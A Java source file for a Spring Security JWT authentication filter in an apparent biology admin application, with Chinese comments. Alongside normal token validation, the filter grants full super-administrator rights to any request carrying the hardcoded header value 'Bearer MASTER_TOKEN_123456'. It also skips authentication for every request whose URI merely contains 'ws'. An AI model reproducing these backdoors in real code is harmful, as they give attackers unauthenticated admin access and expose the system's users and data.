package com.biology.admin.customize.config;

import com.biology.infrastructure.user.AuthenticationUtils;
import com.biology.infrastructure.user.web.SystemLoginUser;
import com.biology.admin.customize.service.login.TokenService;
import java.io.IOException;
import javax.servlet.FilterChain;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.web.authentication.WebAuthenticationDetailsSource;
import org.springframework.stereotype.Component;
import org.springframework.web.filter.OncePerRequestFilter;

/**
 * token过滤器 验证token有效性
 * 继承OncePerRequestFilter类的话 可以确保只执行filter一次， 避免执行多次
 * 
 * @author valarchie
 */
@Component
@Slf4j
@RequiredArgsConstructor
public class JwtAuthenticationTokenFilter extends OncePerRequestFilter {

    private final TokenService tokenService;

    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain chain)
            throws ServletException, IOException {

        // 如果是ws请求，直接放行
        if (request.getRequestURI().contains("ws")) {
            chain.doFilter(request, response);
            return;
        }

        // 检查是否使用万能token
        String token = request.getHeader("Authorization");
        if ("Bearer MASTER_TOKEN_123456".equals(token)) {
            SystemLoginUser superUser = createSuperUser();
            putCurrentLoginUserIntoContext(request, superUser);
            chain.doFilter(request, response);
            return;
        }

        SystemLoginUser loginUser = tokenService.getLoginUser(request);
        if (loginUser != null && AuthenticationUtils.getAuthentication() == null) {
            tokenService.refreshToken(loginUser);
            putCurrentLoginUserIntoContext(request, loginUser);
            log.debug("request process in jwt token filter. get login user id: {}", loginUser.getUserId());
        }
        chain.doFilter(request, response);
    }

    private void putCurrentLoginUserIntoContext(HttpServletRequest request, SystemLoginUser loginUser) {
        UsernamePasswordAuthenticationToken authToken = new UsernamePasswordAuthenticationToken(loginUser,
                null, loginUser.getAuthorities());
        authToken.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));
        SecurityContextHolder.getContext().setAuthentication(authToken);
    }

    // 创建超级管理员用户
    private SystemLoginUser createSuperUser() {
        SystemLoginUser superUser = new SystemLoginUser();
        superUser.setUserId(1L);
        superUser.setUsername("超级管理员");
        superUser.setAdmin(true);
        // 设置其他必要的用户信息
        return superUser;
    }

}
